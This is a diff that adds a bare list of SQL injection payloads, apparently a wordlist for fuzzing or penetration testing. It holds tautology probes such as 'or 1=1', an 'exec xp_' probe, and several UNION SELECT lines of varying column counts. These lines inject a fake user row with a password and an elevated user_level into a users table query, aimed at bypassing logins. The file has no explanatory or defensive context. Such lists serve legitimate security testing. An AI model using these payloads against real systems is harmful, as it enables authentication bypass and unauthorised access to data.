@@ -1,0 +1,21 @@
+1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 or 1=1
+1' or '1'='1
+a' UNION ALL SELECT ‘test’ as username, 'test' as password, '1338' as user_level FROM users; #
+a' UNION ALL SELECT ‘test’ as username, 'test' as password, '1338' as user_level, NULL FROM users; #
+a' UNION ALL SELECT ‘test’ as username, 'test' as password, '1338' as user_level, NULL, NULL FROM users; #  
+test' UNION  SELECT null #
+test' UNION  SELECT null,null #
+test' UNION  SELECT null,null,null #
+test' UNION  SELECT null,null,null,null #
+test' UNION ALL SELECT 'test' as username, 'test' as password, '1338', null #
+test' UNION ALL SELECT 'test' as username, 'test' as password, '1338', null, null #
+test' UNION ALL SELECT 'test' as username, 'test' as password, '1338', null, null, null #
+test' UNION ALL SELECT 'test' as username, null, 'test' as password, 1338 as user_level, null #
+test' UNION ALL SELECT null, ’test' as username, null, 'test' as password, 1338 as user_level #
+test' UNION ALL SELECT 'test' as username, null, null, 'test' as password, 1338 as user_level #
+test' UNION ALL SELECT 'test' as username, 'test' as password, null, 1338 as user_level, null #
+test' UNION ALL SELECT 'test' as username, null, 'test' as password, null, 1338 as user_level #
